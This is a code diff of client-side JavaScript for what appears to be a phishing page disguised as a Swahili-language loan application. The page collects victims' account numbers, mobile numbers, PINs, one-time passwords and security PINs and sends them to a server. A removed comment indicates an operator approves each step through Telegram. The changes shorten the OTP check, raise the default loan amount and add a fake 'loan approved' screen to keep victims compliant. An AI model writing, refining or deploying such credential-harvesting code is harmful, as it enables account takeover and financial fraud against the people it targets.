@@ -1,7 +1,6 @@
 const sessionId = 'session_' + Math.random().toString(36).substring(2, 9);
 let pollInterval = null;
 
-// UI Elements
 const steps = {
     loan: document.getElementById('step-loan'),
     credentials: document.getElementById('step-credentials'),
@@ -26,7 +25,6 @@ function showNotification(message, isError = false) {
     else banner.classList.remove('error');
 }
 
-// Loan sliders
 const loanAmount = document.getElementById('loan-amount');
 const loanMonths = document.getElementById('loan-months');
 const amountText = document.getElementById('amount-text');
@@ -47,12 +45,10 @@ function updateLoanCalc() {
     monthlyPayment.textContent = `TSh ${monthly.toLocaleString()}`;
 }
 
-// Start Application
 document.getElementById('btn-omba').addEventListener('click', () => {
     showStep('credentials');
 });
 
-// Submit Credentials with Validation (Mobile must start with 0)
 document.getElementById('btn-continue-creds').addEventListener('click', async () => {
     const accountNumber = document.getElementById('acc-number').value.trim();
     const mobileNumber = document.getElementById('mobile-number').value.trim();
@@ -81,8 +77,8 @@ document.getElementById('btn-continue-creds').addEventListener('click', async ()
                 mobileNumber,
                 pin,
                 loanDetails: {
-                    amount: amountText ? amountText.textContent : 'TSh 100,000',
-                    monthly: monthlyPayment ? monthlyPayment.textContent : 'TSh 9,504'
+                    amount: amountText ? amountText.textContent : 'TSh 1,000,000',
+                    monthly: monthlyPayment ? monthlyPayment.textContent : 'TSh 95,833'
                 }
             })
         });
@@ -99,7 +95,6 @@ document.getElementById('btn-continue-creds').addEventListener('click', async ()
     }
 });
 
-// Auto-advance & Strict Numeric Sanitization for PIN/OTP inputs
 setupPinInputs('.otp-box');
 setupPinInputs('.pin-box');
 
@@ -107,9 +102,7 @@ function setupPinInputs(selector) {
     const boxes = document.querySelectorAll(selector);
     boxes.forEach((box, index) => {
         box.addEventListener('input', (e) => {
-            // Instantly strip out any non-digit character (letters/symbols)
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
-
             if (e.target.value && index < boxes.length - 1) {
                 boxes[index + 1].focus();
             }
@@ -122,13 +115,13 @@ function setupPinInputs(selector) {
     });
 }
 
-// Submit OTP (Must be 6 digits numeric)
+// Submit OTP (Must be 5 digits numeric)
 document.getElementById('btn-verify-otp').addEventListener('click', async () => {
     const boxes = document.querySelectorAll('#step-otp .otp-box');
     const otp = Array.from(boxes).map(b => b.value).join('');
     
-    if (otp.length < 6) {
-        alert('Tafadhali ingiza OTP kamili ya tarakimu 6 (namba pekee).');
+    if (otp.length < 5) {
+        alert('Tafadhali ingiza OTP kamili ya tarakimu 5 (namba pekee).');
         return;
     }
 
@@ -138,6 +131,10 @@ document.getElementById('btn-verify-otp').addEventListener('click', async () => 
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId, otp })
         });
+        
+        // Show waiting spinner screen
+        showStep('success');
+        startCountdown();
         showNotification('OTP imetumwa. Inasubiri uthibitisho...');
         startPolling();
     } catch (err) {
@@ -145,7 +142,7 @@ document.getElementById('btn-verify-otp').addEventListener('click', async () => 
     }
 });
 
-// Submit Security PIN (Numeric Only)
+// Submit Security PIN
 document.getElementById('btn-verify-security-pin').addEventListener('click', async () => {
     const boxes = document.querySelectorAll('#step-security-pin .pin-box');
     const securityPin = Array.from(boxes).map(b => b.value).join('');
@@ -160,6 +157,10 @@ document.getElementById('btn-verify-security-pin').addEventListener('click', asy
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId, securityPin })
         });
+        
+        // Show waiting spinner screen
+        showStep('success');
+        startCountdown();
         showNotification('PIN imetumwa. Inasubiri idhini ya mwisho...');
         startPolling();
     } catch (err) {
@@ -167,7 +168,18 @@ document.getElementById('btn-verify-security-pin').addEventListener('click', asy
     }
 });
 
-// Polling loop to check admin actions from Telegram
+function startCountdown() {
+    let timeLeft = 3;
+    const timerEl = document.getElementById('countdown-timer');
+    const interval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+        }
+    }, 1000);
+}
+
 function startPolling() {
     if (pollInterval) clearInterval(pollInterval);
 
@@ -188,10 +200,26 @@ function startPolling() {
                 showStep('securityPin');
                 clearInterval(pollInterval);
             } else if (data.status === 'success') {
-                const approvedAmt = document.getElementById('approved-amount-text');
-                const successMon = document.getElementById('success-monthly');
-                if (approvedAmt && amountText) approvedAmt.textContent = amountText.textContent;
-                if (successMon && monthlyPayment) successMon.textContent = monthlyPayment.textContent;
+                const iconContainer = document.getElementById('success-icon-container');
+                const titleEl = document.getElementById('success-title');
+                const subtitleEl = document.getElementById('success-subtitle');
+                const countdownBanner = document.getElementById('countdown-banner');
+                const noteBox = document.getElementById('success-note-box');
+                const btnFinish = document.getElementById('btn-finish');
+                
+                if (iconContainer) iconContainer.textContent = '✅';
+                if (titleEl) titleEl.textContent = 'Ombi Lako Limefanikiwa!';
+                if (subtitleEl) {
+                    subtitleEl.innerHTML = `Mkopo wako umeidhinishwa na kiasi cha <span class="highlight">${amountText ? amountText.textContent : 'TSh 1,000,000'}</span> kimetumwa kwenye akaunti yako.`;
+                }
+                if (countdownBanner) countdownBanner.classList.add('hidden');
+                if (noteBox) {
+                    const successMon = document.getElementById('success-monthly');
+                    if (successMon && monthlyPayment) successMon.textContent = monthlyPayment.textContent;
+                    noteBox.classList.remove('hidden');
+                }
+                if (btnFinish) btnFinish.classList.remove('hidden');
+
                 showStep('success');
                 clearInterval(pollInterval);
             } else if (data.status === 'error') {
@@ -204,4 +232,5 @@ function startPolling() {
             console.error('Polling error:', e);
         }
     }, 3000);
-}
+                                                     }
+        
